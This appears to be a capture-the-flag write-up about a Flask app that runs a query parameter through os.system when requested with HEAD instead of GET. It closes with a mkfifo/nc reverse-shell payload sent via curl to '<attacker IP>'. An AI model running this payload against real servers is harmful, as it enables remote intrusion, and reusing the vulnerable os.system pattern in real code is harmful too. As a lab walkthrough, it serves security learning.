Given the source code for the web

```python
#!/usr/bin/env python3
from flask import Flask, request
import os

app = Flask(__name__)

@app.route('/' , methods=['GET'])
def index():
    c = request.args.get('c', '')
    if not c:
        return "hmm gimme something"

    if request.method == 'GET':
        ''
    else:
        os.system(c)
    return c

app.run(host='0.0.0.0', port=1337)
```
This Flask application has a potential security vulnerability because it allows arbitrary command execution through the os.system(c) line when the else branch is triggered. The input ```url/?c=``` comes directly from the query string, which means that an attacker could inject any command via the URL and execute it on the server.

But in the initial state the web uses a GET method as the request and looking at the source code

```python
def index():
    c = request.args.get('c', '')
    if not c:
        return "hmm gimme something"

    if request.method == 'GET':
        ''
```
if the method being use is a GET request we get nothing. Now look a the ```else``` condition
```python
 else:
        os.system(c)
    return c
```
so if we make use of another request method like HEAD, which is a request method that was allowed, we will be able to get the vulnerability. which is command injection

so the payload used was ``` curl -I http://url/?c=`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <attacker IP> <port> >/tmp/f` ```  this payload was used beacuse it was a blind command injection . This will get us a reverse shell and we can get the flag
